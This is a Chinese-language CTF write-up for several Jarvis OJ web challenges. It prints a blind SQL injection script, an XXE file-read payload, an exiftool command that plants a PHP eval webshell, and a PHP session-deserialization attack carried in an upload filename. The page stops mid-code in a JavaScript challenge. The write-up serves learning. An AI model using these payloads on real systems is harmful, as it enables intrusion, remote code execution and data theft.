<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="comment">#created by noble @ 2017.1.21</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = "http://web.jarvisoj.com:32787/login.php"</span><br><span class="line">table_name_temp = "admin'<span class="comment">/**/</span>and<span class="comment">/**/</span>ascii(substr((<span class="keyword">select</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="keyword">database</span>()<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">0</span>,<span class="number">1</span>),&#123;<span class="number">0</span>&#125;,<span class="number">1</span>))&gt;&#123;<span class="number">1</span>&#125;<span class="comment">#"</span></span><br><span class="line">column_name_temp = <span class="string">"admin'/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x61646D696E/**/limit/**/2,1),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line">password_temp = <span class="string">"admin'/**/and/**/ascii(substr((select/**/password/**/from/**/admin/**/limit/**/0,1),&#123;0&#125;,1))&gt;&#123;1&#125;#"</span></span><br><span class="line"><span class="keyword">result</span> = <span class="string">""</span></span><br><span class="line"><span class="keyword">session</span> = requests.Session()</span><br><span class="line"><span class="built_in">char</span> = <span class="string">"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">50</span>):      <span class="comment">#设置字符长度为50</span></span><br><span class="line">       <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">char</span>:</span><br><span class="line">              <span class="keyword">asc</span> = <span class="keyword">ord</span>(c)      <span class="comment">#获取字符的ascii值</span></span><br><span class="line">              username = password_temp.format(i, <span class="keyword">asc</span>)</span><br><span class="line">              <span class="comment">#print username</span></span><br><span class="line">              <span class="keyword">data</span> = &#123;<span class="string">'username'</span>: username,</span><br><span class="line">              <span class="string">'password'</span>: <span class="string">'admin'</span></span><br><span class="line">              &#125;</span><br><span class="line">              req = session.post(<span class="keyword">url</span>=<span class="keyword">url</span>, <span class="keyword">data</span>=<span class="keyword">data</span>, <span class="keyword">timeout</span>=<span class="number">10</span>)</span><br><span class="line">              <span class="keyword">status</span> = req.status_code</span><br><span class="line">              <span class="keyword">length</span> = req.headers[<span class="string">'content-length'</span>]</span><br><span class="line">              <span class="keyword">if</span> <span class="keyword">status</span> == <span class="number">200</span>:</span><br><span class="line">                     <span class="comment">#print length</span></span><br><span class="line">                     <span class="comment">#print req.text</span></span><br><span class="line">                     <span class="comment">#返回的长度只有1202和1205</span></span><br><span class="line">                     <span class="keyword">if</span> <span class="keyword">length</span> == <span class="string">"1205"</span>:</span><br><span class="line">                            <span class="keyword">result</span> += c</span><br><span class="line">                            print c</span><br><span class="line">                            break</span><br><span class="line">print <span class="keyword">result</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>最后得到32位字符串，估计是md5，在线解得到密码<strong>eTAloCrEP</strong></p>
<blockquote>
<p>flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p>
</blockquote>
</li>
</ol>
<h1 id="api调用"><a href="#api调用" class="headerlink" title="api调用"></a>api调用</h1><p>题目入口：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p>
<blockquote>
<p>请设法获得目标机器/home/ctf/flag.txt中的flag值。</p>
</blockquote>
<ol>
<li><p>有一个提交框，输入什么就显示什么加上own,源码如下</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> xhr;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span></span><br><span class="line"><span class="actionscript">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span></span><br><span class="line"><span class="actionscript">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> xhr;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span></span><br><span class="line"><span class="actionscript"> <span class="keyword">var</span> xhr = XHR();</span></span><br><span class="line"><span class="actionscript">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span></span><br><span class="line"><span class="actionscript">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span></span><br><span class="line"><span class="javascript">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span></span><br><span class="line"><span class="javascript">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span></span><br><span class="line"><span class="undefined">             tip_area.value = data.task.search+data.task.value;</span></span><br><span class="line"><span class="undefined">         &#125;</span></span><br><span class="line"><span class="undefined">     &#125;;</span></span><br><span class="line"><span class="actionscript">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span></span><br><span class="line"><span class="actionscript">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>通过抓包发现传的json包</p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">请求:</span><br><span class="line">&#123;<span class="string">"search"</span>:<span class="string">"cat flag"</span>,<span class="string">"value"</span>:<span class="string">"own"</span>&#125;</span><br><span class="line">回应:</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"task"</span>: &#123;</span><br><span class="line">    <span class="string">"done"</span>: false, </span><br><span class="line">    <span class="string">"search"</span>: <span class="string">"cat flag"</span>, </span><br><span class="line">    <span class="string">"value"</span>: <span class="string">"own"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>考虑到题目提示,想到了利用XXE读取文件</p>
</li>
<li>改Content-Type为application/xml,内容<name>hack!</name>,回显成功</li>
<li>构造payload<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE get[</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">hack</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">home</span>/<span class="attr">ctf</span>/<span class="attr">flag.txt</span>"&gt;</span>]&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">get</span>&gt;</span>&amp;hack;<span class="tag">&lt;/<span class="name">get</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">#CTF</span><span class="template-variable">&#123;XxE_15_n0T_S7range_Enough&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="图片上传漏洞"><a href="#图片上传漏洞" class="headerlink" title="图片上传漏洞"></a>图片上传漏洞</h1><p>题目入口：<a href="http://web.jarvisoj.com:32790/" target="_blank" rel="noopener">http://web.jarvisoj.com:32790/</a><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">请设法获取/home/ctf/<span class="built_in">flag</span>.txt 中的<span class="built_in">flag</span>值。</span><br><span class="line">(建议使用png文件上传)</span><br></pre></td></tr></table></figure></p>
<ol>
<li>这题纯属就是涨姿势了，之前的各种绕过都不行，后来才发现是个CVE<a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">参考</a></li>
<li>看WP说用exiftool生成图片马，但打死找不到生成的后门，<del>我太菜了，本想借刀杀人用别人留下的马，但也连不上好像被搅屎了</del>，日后再做</li>
<li>贴个payload<blockquote>
<p>exiftool -label=”\”|/bin/echo \&lt;?php \@eval(\$_POST[x])\;?> &gt;<br>/opt/lampp/htdocs/uploads/x.php; \”” 1.png</p>
</blockquote>
</li>
<li>上传然后filetype改为show</li>
</ol>
<h1 id="PHPINFO"><a href="#PHPINFO" class="headerlink" title="PHPINFO"></a>PHPINFO</h1><p>题目入口：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
<ol>
<li><p>进去直接看到源码</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//A webshell is wait for you</span></span></span><br><span class="line"><span class="php">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span></span><br><span class="line"><span class="php">session_start();</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $mdzz;</span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $m = <span class="keyword">new</span> OowoO();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>传个phpinfo参数就能看到phpinfo,不知道要干嘛</p>
</li>
<li><p>继续学习姿势，网上WP</p>
<figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">ini_set</span>(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"><span class="selector-id">#ini_set</span>设置指定配置选项的值。这个选项会在脚本运行时保持新的值，并在脚本结束时恢复。</span><br><span class="line">这是突破点</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>session.serialize_handler</strong>容易想到wooyun上的文章《PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患》。</p>
<blockquote>
<p>通过phpinfo页面，我们知道php.ini中默认session.serialize_handler为php_serialize，而index.php中将其设置为php。这就导致了seesion的反序列化问题。</p>
</blockquote>
</li>
</ol>
<p><img src="https://github.com/Cy9nusG4rd3n/images/blob/master/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20190916171728.png?raw=true" alt=""></p>
<ol start="5">
<li>由phpinfo()页面知，<strong>session.upload_progress.enabled</strong>为<strong>On</strong>。当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name<strong>同名</strong>变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session<br><img src="https://img-blog.csdn.net/20171103001723738?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd3lfOTc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></li>
<li>但是，这时就有一个问题，在题目代码中，没有某个值是用来接受我们传入的数据，并储存到$_SESSION中的。<br>其实我们是有办法传入$_SESSION数据的，这里就利用到了|的反序列化问题</li>
<li><p>先构造上传和post同时进行的页面</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span><span class="comment">&lt;!-- 	</span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"上传"</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>接下来考虑序列化的问题。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(scandir(dirname(__FILE__)));'</span>;<span class="comment">#打印读取的文件内容</span></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> OowoO();</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:5:"OowoO":1:&#123;s:4:"mdzz";s:36:"print_r(scandir(dirname(__FILE__)));";&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>为防止转义，在引号前加上\。利用前面的html页面随便上传一个东西，抓包，把filename改为如下</p>
<blockquote>
<p>|O:5:\”OowoO\”:1:{s:4:\”mdzz\”;s:36:\”print_r(scandir(dirname(<strong>FILE</strong>)));\”;}</p>
</blockquote>
</li>
<li><p>注意前面有| ,然后随便上传东西抓包,为filename为上述,得到回显</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;/code&gt;<span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; .</span><br><span class="line">    [<span class="number">1</span>] =&gt; ..</span><br><span class="line">    [<span class="number">2</span>] =&gt; Here_1s_7he_fl4g_buT_You_Cannot_see.php</span><br><span class="line">    [<span class="number">3</span>] =&gt; index.php</span><br><span class="line">    [<span class="number">4</span>] =&gt; phpinfo.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
<li><p>根据phpinfo得到路径/opt/lampp/htdocs/</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mdzz</span>改为<span class="symbol">:print_r</span>(file_get_contents(<span class="string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span>));</span><br><span class="line">↓</span><br><span class="line"><span class="symbol">O:</span><span class="number">5</span><span class="symbol">:<span class="string">"OowoO"</span></span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:</span>&#123;<span class="symbol">s:</span><span class="number">4</span><span class="symbol">:<span class="string">"mdzz"</span></span>;<span class="symbol">s:</span><span class="number">88</span><span class="symbol">:<span class="string">"print_r(file_get_contents("</span>/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see</span>.php<span class="string">"));"</span>;&#125;</span><br><span class="line">↓</span><br><span class="line">|<span class="symbol">O:</span><span class="number">5</span><span class="symbol">:</span>\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>抓包改filename</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php">	$flag=<span class="string">"CTF&#123;4d96e37f4be998c50aa586de4ada354a&#125;"</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><a href="https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO" target="_blank" rel="noopener">参考资料</a></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h1><p>题目入口：<a href="http://web.jarvisoj.com:9891/" target="_blank" rel="noopener">http://web.jarvisoj.com:9891/</a></p>
<blockquote>
<p>这么简单的题，是WEB吗？</p>
</blockquote>
<ol>
<li>有个密码输入框，随便输入点返回<strong>Wrong Password!!</strong></li>
<li><p>查源码发现有个app.js点进去,查找<strong>Wrong Password!!</strong>,主要代码如下</p>
<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">            key: <span class="string">"__checkpass__REACT_HOT_LOADER__"</span>,</span><br><span class="line">            value: function(<span class="name">e</span>) &#123;</span><br><span class="line">                if (<span class="number">25</span> !== e.length) return ! <span class="number">1</span><span class="comment">;</span></span><br><span class="line">                for (<span class="name"><span class="builtin-name">var</span></span> t = [], n = <span class="number">0</span><span class="comment">; n &lt; 25; n++) t.push(e.charCodeAt(n));</span></span><br><span class="line">                for (<span class="name"><span class="builtin-name">var</span></span> r = [<span class="number">325799</span>, <span class="number">309234</span>, <span class="number">317320</span>, <span class="number">327895</span>, <span class="number">298316</span>, <span class="number">301249</span>, <span class="number">330242</span>, <span class="number">289290</span>, <span class="number">273446</span>, <span class="number">337687</span>, <span class="number">258725</span>, <span class="number">267444</span>, <span class="number">373557</span>, <span class="number">322237</span>, <span class="number">344478</span>, <span class="number">362136</span>, <span class="number">331815</span>, <span class="number">315157</span>, <span class="number">299242</span>, <span class="number">305418</span>, <span class="number">313569</span>, <span class="number">269307</span>, <span class="number">338319</span>, <span class="number">306491</span>, <span class="number">351259</span>], o = [[<span class="number">11</span>, <span class="number">13</span>, <span class="number">32</span>, <span class="number">234</span>, <span class="number">236</span>, <span class="number">3</span>, <span class="number">72</span>, <span class="number">237</span>, <span class="number">122</span>, <span class="number">230</span>, <span class="number">157</span>, <span class="number">53</span>, <span class="number">7</span>, <span class="number">225</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">142</span>, <span class="number">166</span>, <span class="number">11</span>, <span class="number">196</span>, <span class="number">194</span>, <span class="number">187</span>, <span class="number">152</span>, <span class="number">132</span>, <span class="number">135</span>], [<span class="number">76</span>, <span class="number">55</span>, <span class="number">38</span>, <span class="number">70</span>, <span class="number">98</span>, <span class="number">244</span>, <span class="number">201</span>, <span class="number">125</span>, <span class="number">182</span>, <span class="number">123</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">67</span>, <span class="number">19</span>, <span class="number">145</span>, <span class="number">12</span>, <span class="number">138</span>, <span class="number">149</span>, <span class="number">83</span>, <span class="number">178</span>, <span class="number">255</span>, <span class="number">122</span>, <span class="number">238</span>, <span class="number">187</span>, <span class="number">221</span>], [<span class="number">218</span>, <span class="number">233</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">151</span>, <span class="number">28</span>, <span class="number">150</span>, <span class="number">196</span>, <span class="number">79</span>, <span class="number">11</span>, <span class="number">150</span>, <span class="number">128</span>, <span class="number">52</span>, <span class="number">228</span>, <span class="number">189</span>, <span class="number">107</span>, <span class="number">219</span>, <span class="number">87</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">45</span>, <span class="number">201</span>, <span class="number">14</span>, <span class="number">106</span>, <span class="number">230</span>], [<span class="number">30</span>, <span class="number">50</span>, <span class="number">76</span>, <span class="number">94</span>, <span class="number">172</span>, <span class="number">61</span>, <span class="number">229</span>, <span class="number">109</span>, <span class="number">216</span>, <span class="number">12</span>, <span class="number">181</span>, <span class="number">231</span>, <span class="number">174</span>, <span class="number">236</span>, <span class="number">159</span>, <span class="number">128</span>, <span class="number">245</span>, <span class="number">52</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">207</span>, <span class="number">145</span>, <span class="number">241</span>, <span class="number">196</span>, <span class="number">80</span>], [<span class="number">134</span>, <span class="number">145</span>, <span class="number">36</span>, <span class="number">255</span>, <span class="number">13</span>, <span class="number">239</span>, <span class="number">212</span>, <span class="number">135</span>, <span class="number">85</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">50</span>, <span class="number">170</span>, <span class="number">78</span>, <span class="number">51</span>, <span class="number">10</span>, <span class="number">232</span>, <span class="number">132</span>, <span class="number">60</span>, <span class="number">122</span>, <span class="number">117</span>, <span class="number">74</span>, <span class="number">117</span>, <span class="number">250</span>, <span class="number">45</span>], [<span class="number">142</span>, <span class="number">221</span>, <span class="number">121</span>, <span class="number">56</span>, <span class="number">56</span>, <span class="number">120</span>, <span class="number">113</span>, <span class="number">143</span>, <span class="number">77</span>, <span class="number">190</span>, <span class="number">195</span>, <span class="number">133</span>, <span class="number">236</span>, <span class="number">111</span>, <span class="number">144</span>, <span class="number">65</span>, <span class="number">172</span>, <span class="number">74</span>, <span class="number">160</span>, <span class="number">1</span>, <span class="number">143</span>, <span class="number">242</span>, <span class="number">96</span>, <span class="number">70</span>, <span class="number">107</span>], [<span class="number">229</span>, <span class="number">79</span>, <span class="number">167</span>, <span class="number">88</span>, <span class="number">165</span>, <span class="number">38</span>, <span class="number">108</span>, <span class="number">27</span>, <span class="number">75</span>, <span class="number">240</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">165</span>, <span class="number">206</span>, <span class="number">156</span>, <span class="number">193</span>, <span class="number">86</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">187</span>, <span class="number">161</span>, <span class="number">55</span>, <span class="number">134</span>, <span class="number">24</span>, <span class="number">249</span>], [<span class="number">235</span>, <span class="number">175</span>, <span class="number">235</span>, <span class="number">169</span>, <span class="number">73</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">6</span>, <span class="number">142</span>, <span class="number">162</span>, <span class="number">228</span>, <span class="number">157</span>, <span class="number">160</span>, <span class="number">66</span>, <span class="number">28</span>, <span class="number">167</span>, <span class="number">63</span>, <span class="number">41</span>, <span class="number">182</span>, <span class="number">55</span>, <span class="number">189</span>, <span class="number">56</span>, <span class="number">102</span>, <span class="number">31</span>, <span class="number">158</span>], [<span class="number">37</span>, <span class="number">190</span>, <span class="number">169</span>, <span class="number">116</span>, <span class="number">172</span>, <span class="number">66</span>, <span class="number">9</span>, <span class="number">229</span>, <span class="number">188</span>, <span class="number">63</span>, <span class="number">138</span>, <span class="number">111</span>, <span 